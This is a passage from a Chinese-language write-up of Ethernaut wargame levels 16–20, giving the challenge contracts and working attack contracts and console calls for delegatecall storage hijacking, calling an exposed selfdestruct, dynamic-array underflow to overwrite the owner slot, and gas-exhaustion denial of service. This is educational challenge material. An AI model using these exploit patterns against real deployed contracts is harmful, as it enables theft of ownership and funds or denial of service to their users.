                    storedTime
    ---------------------------------------------------         slot 0
                    32 bytes
    ===================================================
除此之外，还需要说明一点：经过多次调试发现，当该合约初始化时，`Preservation`的slot
0上（也就是`timeZone1Library`变量)存储的是`Preservation`合约的地址，而slot
1(也就是`timeZone2Library`)上存储的是`LibraryContract`合约的地址，slot
2上存的owner地址，我们的最终目的就是修改slot 2上的地址为我们的地址。
由于上述存储关系，当我们调用`setFirstTime`函数时，实际上是在`Preservation`合约内部调用`setTime`函数，那么此时修改的storage存储上的第一个变量实际上是`timeZone1Library`所在的slot
0，利用这一点，我们可以任意写`timeZone1Library`对应的地址。如果将`timeZone1Library`的地址写成我们部署的恶意合约地址，并在恶意合约内写一个`setTime`函数，当执行`timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature,
_timeStamp));`时就会调用到我们恶意合约内部的`setTime`函数，那么就可以实现合约的任意代码执行。具体操作如下：
  1. 编写如下合约并部署，这里只要保证owner占据slot 2的低20个字节即可。
        pragma solidity ^0.6.0;
     contract attack{
         address public timeZone1Library;
         address public timeZone2Library;
         address public owner; 
         function setTime(uint256 a) public {
             owner = address(a);
         }
     }
  2. 执行`await contract.setFirstTime('0xFB729c0f52FB99EFCDF135B35B614FE7097Dcc5D');`，其中`0xFB729c0f52FB99EFCDF135B35B614FE7097Dcc5D`换成你对应部署的恶意合约地址，通过这一步，修改`timeZone1Library`为恶意合约的地址
  3. 然后执行`await contract.setFirstTime('0x8837D23b683529152E334F64924bCE82477A4261');`，这里括号内的是metamask的钱包地址，完成篡改。
> 这里`setSecondTime`函数实际上修改的是`LibraryContract`中的变量，感觉没什么用。
# 17\. Recovery
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
    contract Recovery {
      //generate tokens
      function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
      }
    }
    contract SimpleToken {
      using SafeMath for uint256;
      // public variables
      string public name;
      mapping (address => uint) public balances;
      // constructor
      constructor(string memory _name, address _creator, uint256 _initialSupply) public {
        name = _name;
        balances[_creator] = _initialSupply;
      }
      // collect ether in return for tokens
      receive() external payable {
        balances[msg.sender] = msg.value.mul(10);
      }
      // allow transfers of tokens
      function transfer(address _to, uint _amount) public { 
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = _amount;
      }
      // clean up after ourselves
      function destroy(address payable _to) public {
        selfdestruct(_to);
      }
    }
这个题创建者利用`Recovery`合约创建了一个`SimpleToken`合约吗，题目目的是让我们找到失去的合约地址，比较简单。
首先在`https://rinkeby.etherscan.io/`搜索一下创建的`Recovery`合约对应的地址，譬如我这里是`0xe04C212cf49E9fBf4D9eAB0b9570c4A152031Ca1`，查看该合约的`Internal
Txns`，可以发现有三条记录，其中最近一条，就是创建的`SimpleToken`合约的地址
点开后可以得到对应合约的地址，我这里是`0x2b62a7805C6CAfb5585c66E9C86a47d8a4008166`，然后直接针对这个合约调用`destory`函数即可，代码如下，其中`target`设置为上面找到的合约地址，`myaddr`设置为metamask钱包账户地址。
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract attack {
        address payable target;
        address payable myaddr;
        constructor(address payable _addr, address payable _myaddr) public {
            target=_addr;
            myaddr=_myaddr;
        }
        function exploit() public{
            target.call(abi.encodeWithSignature("destroy(address)",myaddr));
        }
    }
# 18\. MagicNumber
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract MagicNum {
      address public solver;
      constructor() public {}
      function setSolver(address _solver) public {
        solver = _solver;
      }
      /*
        ____________/\\\_______/\\\\\\\\\_____        
         __________/\\\\\_____/\\\///////\\\___       
          ________/\\\/\\\____\///______\//\\\__      
           ______/\\\/\/\\\______________/\\\/___     
            ____/\\\/__\/\\\___________/\\\//_____    
             __/\\\\\\\\\\\\\\\\_____/\\\//________   
              _\///////////\\\//____/\\\/___________  
               ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
                ___________\///_____\///////////////__
      */
    }
题目要求我们给出一个合约地址，该合约需要返回`whatIsTheMeaningOfLife()`的正确数字，查了一下这个对应的数字是42。除此之外，本题还有一个要求，就是合约必须只能有10个操作码，因此我们必须使用字节码手动编写一个程序，参考
  1. 首先需要构造`runtime opcode`运行时代码，也就是构造一下返回42的逻辑。最后一条命令一定是RETURN，而RETURN指令返回时，statck[0](即栈顶)对应的数字是`offset`，statck[1]是`length`，其最终返回的是`memory[offset:offset+length]`，因此我们首先需要把返回值42存到memory中，对应代码如下:
    偏移    指令对应字节               实际汇编指令
    0000    60                 PUSH1 0x2a
    0002    60                 PUSH1 0x50
    0004    52                 mstore
    0007    60                 PUSH1 0x20
    0009    60                 PUSH1 0x50
    000B    F3                 RETURN
上述汇编代码对应字节序列是`602a60505260206050f3`正好10个opcode，也是正好10个字节。这里`offset`最好设置的大一点，比如设置为0x50，具体原因在下面解释。
  1. 构造完成后，还需要在上述代码前面加上初始化代码，初始化代码的作用是将我们上面的构造的运行时代码复制到`memory`中，然后再RETURN否则无法直接运行。复制代码利用`CODECOPY`指令
于是，我们考虑首先push这3个变量
    偏移    指令对应字节   实际汇编指令
    0000    60            PUSH1 0x0a
    0002    60            PUSH1 0x0c
    0004    60            PUSH1 0x00
    0006    39            CODECOPY
    0007    60            PUSH1 0x0a
    0009    60            PUSH1 0x00
    000B    F3            RETURN
第一步`PUSH1 0x0a`对应的是length变量，因为我们上面构造的opcode序列长度为10。第二步`PUSH1
0x0c`是因为，初始化代码的长度为0xB，也就是运行时代码的字节码是从0xc偏移开始的，因此`offset`为0xc。第三步`PUSH1
0`是指定将我们的代码复制到memory的slot 0处。前4条指令，
**完成了将0xC到0x16这10个字节复制到memory的0x00到0xA位置处的任务** 。
> 这里就可以解释，为什么上面我们我们需要把0x2a复制到一个比较大的offset
> 0x50上，因为低位被我们用来存储运行时代码对应的字节了，当然如果你把运行时代码放到高位，0x2a放到低位也可以。
后3条指令，就是`return memory[0:0xa]`，也就是返回到我们刚才复制到memory中的运行时指令处，下面接第1部分我们写的代码即可运行。
  1. 所以总的汇编代码如下：
    偏移    指令对应字节   实际汇编指令
    0000    60            PUSH1 0x0a
    0002    60            PUSH1 0x0c
    0004    60            PUSH1 0x00
    0006    39            CODECOPY
    0007    60            PUSH1 0x0a
    0009    60            PUSH1 0x00
    000B    F3            RETURN
    000C    60            PUSH1 0x2a
    000E    60            PUSH1 0x50
    0010    52            MSTORE
    0011    60            PUSH1 0x20
    0013    60            PUSH1 0x50
    0015    F3            RETURN
上述字节码对应序列`600a600c600039600a6000f3602a60505260206050f3`，利用web3部署即可。
# 19 Alien Codex
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.5.0;
    import '../helpers/Ownable-05.sol';
    contract AlienCodex is Ownable {
      bool public contact;
      bytes32[] public codex;
      modifier contacted() {
        assert(contact);
        _;
      }
      function make_contact() public {
        contact = true;
      }
      function record(bytes32 _content) contacted public {
        codex.push(_content);
      }
      function retract() contacted public {
        codex.length--;
      }
      function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
      }
    }
~~又到了我最喜欢的内存布局题目了。~~
注意开头引入了一个`Ownable`合约，可以看
0的低20个字节为我们的地址。
查看一下初始状态，由于还没有往数组里写东西，所以slot 1为0。整体思路就是，通过`record`函数往动态数组里写东西，覆盖slot
0的低20个字节位我们的地址。具体过程如下：
  1. slot 1初始值是0，如果我们调用一下`retract`函数让其减1呢？
这里的内容就变成了$2^{256}-1$，slodity对动态数组的长度这里并没有溢出检查，因此减1即可完成下溢。
  1. 计算一下数组第一个元素的存储位置`keccack256(1)=0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`，于是用$2^{256}-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6$得到的就是slot 0 和codex数组的首地址的偏移
  2. 通过revise函数设置对应偏移，即`contract.revise('0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a','0x0000000000000000000000018837D23b683529152E334F64924bCE82477A4261')`，覆写slot 0，完成题目，这里低20个字节是你的账户地址。
总体来说，这个题目就是考察动态数组的内存布局+简单的整数溢出。
# 20 Denial
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import '@openzeppelin/contracts/math/SafeMath.sol';
    contract Denial {
        using SafeMath for uint256;
        address public partner; // withdrawal partner - pay the gas, split the withdraw
        address payable public constant owner = address(0xA9E);
        uint timeLastWithdrawn;
        mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
        function setWithdrawPartner(address _partner) public {
            partner = _partner;
        }
        // withdraw 1% to recipient and 1% to owner
        function withdraw() public {
            uint amountToSend = address(this).balance.div(100);
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            partner.call{value:amountToSend}("");
            owner.transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = now;
            withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
        }
        // allow deposit of funds
        receive() external payable {}
        // convenience function
        function contractBalance() public view returns (uint) {
            return address(this).balance;
        }
    }
这关的目标就是当owner取款时，我们如果能成功阻止`owner.transfer`这个行为，让合约仍有余额，并且交易的gas为1M或者更少，那么就可以通过本关。
本题代码的主要漏洞在于，`partner.call`在调用`call`函数时没有检查返回值，也没有指定gas，这就导致如果外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现`out
of gas`的错误，从而`revert`，也自然不会执行`owner.transfer`操作。
这个消耗极高的操作有两种实现思路，一种是我们可以通过一个循环，来不断消耗gas，从而达到耗尽gas的目的。另外一种方式是，可以使用`assert`函数，这个函数和`require`比较像，用来做条件检查，`assert`的特点是当参数为false时，会消耗掉所有的gas。
如果是第一种思路，可以这么写
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Attack {
        address public target;
        constructor(address payable _addr)public payable{
            target=_addr;
            target.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        }
        fallback() payable external {
            while(true){
            }
        }
    }
第二种思路就这么写，只需要改一下fallback函数这
    pragma solidity ^0.6.0;
    contract attack {
        address public target;
        constructor(address _addr) public payable {
            target=_addr;
            target.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        }
        fallback() external payable {
            assert(false);
        }
    }
提交instance后查看我们部署的合约地址，可以看到题目合约的`withdraw`操作发生了out of